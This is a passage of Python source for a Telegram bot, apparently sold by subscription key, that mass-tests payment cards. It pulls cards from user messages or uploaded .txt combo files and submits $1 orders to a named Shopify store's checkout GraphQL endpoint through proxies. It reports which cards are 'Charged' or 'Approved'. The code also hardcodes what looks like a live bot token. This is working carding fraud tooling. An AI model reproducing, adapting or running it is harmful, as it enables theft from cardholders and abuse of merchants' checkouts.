lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables': {'receiptId': rid, 'sessionToken': x},
            'operationName': 'PollForReceipt',
        }
        elapsed_time = time.time() - start_time
        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
                text = await response.text()
                if "thank" in text.lower():
                    return ShResult(f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp 
""", elapsed_time, proxy_status)
                elif "actionrequiredreceipt" in text.lower():
                    return ShResult(f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", elapsed_time, proxy_status)

            max_retries = 10
            for _ in range(max_retries):
                async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as final_response:
                    final_text = await final_response.text()
                    fff = find_between(final_text, '"code":"', '"')
                    if "thank" in final_text.lower():
                        return ShResult(f"""Card: {full_card}
Status: Charged🔥
Response: Order # confirmed

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp 
""", elapsed_time, proxy_status)
                    elif "actionrequiredreceipt" in final_text.lower():
                        return ShResult(f"""Card: {full_card}
Status: Approved!✅
Response: ActionRequired

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", elapsed_time, proxy_status)
                    elif "processingreceipt" in final_text.lower():
                        await asyncio.sleep(3)
                        continue
                    else:
                        return ShResult(f"""Card: {full_card}
Status: Declined!❌
Response: {fff}

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", elapsed_time, proxy_status)
            return ShResult(f"""Card: {full_card}
Status: Declined!❌
Response: Processing Failed!

Details: {type} - {level} - {brand}
Bank: {bank}
Country: {country}{flag} - {currency}

Gateway: Shopify 1$
Taken: {elapsed_time:.2f}s
Bot by: ElectraOp
""", elapsed_time, proxy_status)
        except Exception as e:
            return ShResult(f"Final request failed: {str(e)}", time.time()-start_time, proxy_status)

    return ShResult("Card processing completed", time.time()-start_time, proxy_status)

# Telegram Bot Configuration
TOKEN = "8181079198:AAFIE0MVuCPWaC0w1HbBsHlCLJKKGpbDneM"
checking_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload File", callback_data='upload_file')],
        [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("Help", callback_data='help')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /sh 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n"
        "🔥 𝐔𝐬𝐞 /stop 𝐓𝐨 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭o𝐧 𝐁𝐞𝐥𝐨𝐰:",
        reply_markup=reply_markup
    )
    log_event("INFO", "User started bot", update.effective_user.id)

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /genkey <days>")
        return
    try:
        duration = int(context.args[0])
        if duration <= 0:
            await update.message.reply_text("❌ Duration must be a positive integer")
            return
        key = generate_key(duration)
        await update.message.reply_text(
            f"🔑 Key generated successfully!\nKey: <code>{key}</code>\nDuration: {duration} days\n\nUser can redeem with /redeem",
            parse_mode='HTML'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid duration.")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    key = context.args[0].strip()
    if redeem_key(key, user_id):
        user = users_col.find_one({"user_id": user_id})
        expiry = user["expires_at"].strftime("%Y-%m-%d %H:%M:%S UTC")
        await update.message.reply_text(
            f"🎉 Key redeemed successfully!\n🔑 Key: <code>{key}</code>\n⏳ Expires: {expiry}\n\nYou now have access!",
            parse_mode='HTML'
        )
    else:
        await update.message.reply_text("❌ Invalid or used key. Contact @FNxELECTRA.")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /delkey <user_id>")
        return
    try:
        target_user_id = int(context.args[0])
        result = users_col.delete_one({"user_id": target_user_id})
        if result.deleted_count > 0:
            await update.message.reply_text(f"✅ Subscription deleted for user {target_user_id}")
        else:
            await update.message.reply_text(f"❌ No subscription found for user {target_user_id}")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

async def add_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /addproxy <proxy>\nFormat: ip:port or user:pass:ip:port")
        return
    proxy = context.args[0].strip()
    proxies_col.insert_one({"proxy": proxy, "added_at": datetime.utcnow(), "source": "manual"})
    proxy_manager.load_proxies()
    await update.message.reply_text(f"✅ Proxy added: <code>{proxy}</code>", parse_mode='HTML')

async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    proxies = [p for p in proxies_col.find({})]
    if not proxies:
        await update.message.reply_text("No proxies in database")
        return
    proxy_list = "\n".join([f"{i+1}. {p['proxy']} (Source: {p.get('source', 'unknown')})" for i, p in enumerate(proxies)])
    await update.message.reply_text(f"<b>Proxy List:</b>\n<code>{proxy_list}</code>", parse_mode='HTML')

async def del_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /delproxy <proxy_index>")
        return
    try:
        index = int(context.args[0]) - 1
        proxies = [p for p in proxies_col.find({})]
        if 0 <= index < len(proxies):
            proxy = proxies[index]['proxy']
            proxies_col.delete_one({"proxy": proxy})
            proxy_manager.load_proxies()
            await update.message.reply_text(f"✅ Proxy deleted: <code>{proxy}</code>", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Invalid proxy index")
    except ValueError:
        await update.message.reply_text("❌ Invalid index.")

async def reload_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    proxy_manager.load_proxies()
    await update.message.reply_text(f"✅ Proxies reloaded! Total: {len(proxy_manager.proxies)}")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ You are not authorized.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    message = ' '.join(context.args)
    users = users_col.distinct("user_id")
    success = 0
    failed = 0
    broadcast_col.insert_one({
        "message": message,
        "sent_by": user_id,
        "sent_at": datetime.utcnow(),
        "total_users": len(users)
    })
    status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    for user_id in users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.1)
    await status_msg.edit_text(f"📢 Broadcast completed!\n✅ Success: {success}\n❌ Failed: {failed}")

async def check_access(update: Update, context: ContextTypes.DEFAULT_TYPE, handler):
    user_id = update.effective_user.id
    command = update.message.text.split()[0][1:].split('@')[0] if update.message and update.message.text.startswith('/') else None
    if command in ["start", "help", "redeem", "genkey"] or user_id == OWNER_ID or has_valid_access(user_id):
        return await handler(update, context)
    user = users_col.find_one({"user_id": user_id})
    message = (
        f"⛔ Subscription Expired!\nYour access expired on: {user['expires_at'].strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n🔑 Renew with /redeem <key>\nContact @FNxELECTRA"
    ) if user and "expires_at" in user else (
        "⛔ Premium Access Required!\n\n🔑 Purchase a key with /redeem <key>\nContact @FNxELECTRA"
    )
    await update.message.reply_text(message)

async def single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /sh 4242424242424242|01|29|308")
        return
    card = " ".join(context.args)
    checking_msg = await update.message.reply_text("🔍 Checking Your Card...")
    result = await sh(card)
    await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=checking_msg.message_id)
    if "Invalid" in result.message or "failed" in result.message or "error" in result.message.lower():
        await update.message.reply_text(result.message)
        return
    lines = result.message.split('\n')
    full_card = lines[0].split('Card: ')[1].strip() if "Card: " in lines[0] else card
    status = lines[1].split('Status: ')[1].strip() if "Status: " in lines[1] else "Unknown"
    response = lines[2].split('Response: ')[1].strip() if "Response: " in lines[2] else "Unknown"
    card_info = lines[4].split('Details: ')[1].strip() if len(lines) > 4 else "Unknown"
    issuer = lines[5].split('Bank: ')[1].strip() if len(lines) > 5 else "Unknown"
    country_display = lines[6].split('Country: ')[1].strip() if len(lines) > 6 else "Unknown"
    checked_by = f"<a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a>"
    time_taken = f"{result.elapsed_time:.2f}s"
    response_text = (
        f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥\n\n"
        f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
        f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
        f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}\n\n"
        f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
        f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
        f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
        f"[⌬]𝗧𝗶𝗺𝗲 -» {time_taken}\n"
        f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result.proxy_status}\n"
        f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by}\n"
        f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝙎𝙃𝙊𝙋𝙄𝙁𝙔</a>"
    ) if "Charged" in status or "Approved" in status else (
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
        f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{full_card}</code>\n"
        f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Shopify 1$\n"
        f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {response}\n\n"
        f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
        f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
        f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
        f"[⌬]𝗧𝗶𝗺𝗲 -» {time_taken}\n"
        f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result.proxy_status}\n"
        f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by}\n"
        f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝙎𝙃𝙊𝙋𝙄𝙁𝙔</a>"
    )
    await update.message.reply_text(response_text, parse_mode='HTML')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in checking_tasks:
        checking_tasks[user_id]['stop'] = True
        await update.message.reply_text("Checking Stopped")
    else:
        await update.message.reply_text("No active checking process to stop.")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == 'upload_file':
        await query.edit_message_text("Send Your .txt File For Checking")
    elif query.data == 'cancel_check':
        if user_id in checking_tasks:
            checking_tasks[user_id]['stop'] = True
            await query.edit_message_text("Checking Stopped")
        else:
            await query.edit_message_text("No active checking process.")
    elif query.data == 'help':
        await query.edit_message_text(
            "🤖 <b>FN_SH_BOT Bot Help</b>\n\n"
            "🔑 <b>Key System</b>\n1. Use /redeem &lt;key&gt;\n2. Contact @FNxELECTRA\n\n"
            "💳 <b>Card Checking</b>\n1. Single: /sh 4242424242424242|01|29|308\n2. Mass: Send .txt file\n3. Format: 4242424242424242|01|29|308\n\n"
            "⚠️ <b>Limitations</b>\n- Max 1500 cards/5min\n- Use /stop to cancel\n\n"
            "⚙️ <b>Commands</b>\n- /start: Menu\n- /help: This message",
            parse_mode='HTML'
        )

async def check_card_wrapper(card, context, update, results):
    try:
        result = await sh(card)
        return card, result
    except Exception as e:
        return card, ShResult(f"Error: {str(e)}", 0, "Dead")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not update.message.document or not update.message.document.file_name.endswith('.txt'):
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [line.strip() for line in file_content.decode('utf-8').splitlines() if line.strip()]
    if not cards:
        await update.message.reply_text("❌ File is empty.")
        return
    
    total_cards = len(cards)
    if not can_user_check_more(user_id, total_cards):
        wait_time = get_user_wait_time(user_id)
        await update.message.reply_text(f"⚠️ Limit reached! Wait {wait_time // 60}min {wait_time % 60}sec.")
        return
    
    charged = 0
    declined = 0
    start_time = time.time()
    charged_cards = []
    last_status = "Starting..."
    
    checking_tasks[user_id] = {'stop': False, 'message_id': None}
    keyboard = [
        [InlineKeyboardButton(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝🔥: {charged}", callback_data='charged')],
        [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data='declined')],
        [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total_cards}", callback_data='total')],
        [InlineKeyboardButton("𝐒𝐭𝐨𝐩🔴", callback_data='stop_batch')],
        [InlineKeyboardButton(f"𝐋𝐚𝐬𝐭: {last_status}", callback_data='response')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = await update.message.reply_text(
        f"🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...\n━━━━━━━━━━━━━━━━━━━━━━\n[み] 𝐁𝐨𝐭: @FN_SH_BOT",
        reply_markup=reply_markup
    )
    checking_tasks[user_id]['message_id'] = msg.message_id
    
    batch_size = 3
    processed = 0
    results = []
    
    for i in range(0, total_cards, batch_size):
        if checking_tasks[user_id]['stop']:
            break
        batch = cards[i:i + batch_size]
        tasks = [check_card_wrapper(card, context, update, results) for card in batch]
        batch_results = await asyncio.gather(*tasks)
        
        for card, result in batch_results:
            if checking_tasks[user_id]['stop']:
                break
            processed += 1
            lines = result.message.split('\n')
            full_card = lines[0].split('Card: ')[1].strip() if len(lines) > 0 and "Card: " in lines[0] else card
            status = lines[1].split('Status: ')[1].strip() if len(lines) > 1 and "Status: " in lines[1] else "Unknown"
            response = lines[2].split('Response: ')[1].strip() if len(lines) > 2 and "Response: " in lines[2] else "Unknown"
            card_info = lines[4].split('Details: ')[1].strip() if len(lines) > 4 else "Unknown"
            issuer = lines[5].split('Bank: ')[1].strip() if len(lines) > 5 else "Unknown"
            country_display = lines[6].split('Country: ')[1].strip() if len(lines) > 6 else "Unknown"
            checked_by = f"<a href='tg://user?id={user_id}'>{update.effective_user.first_name}</a>"
            time_taken = f"{result.elapsed_time:.2f}s"
            
            if "Charged" in status or "Approved" in status:
                charged += 1
                charged_cards.append(full_card)
                last_status = "Charged"
                response_text = (
                    f"𝐂𝐇𝐀𝐑𝐆𝐄𝐃 1$🔥🔥\n\n"
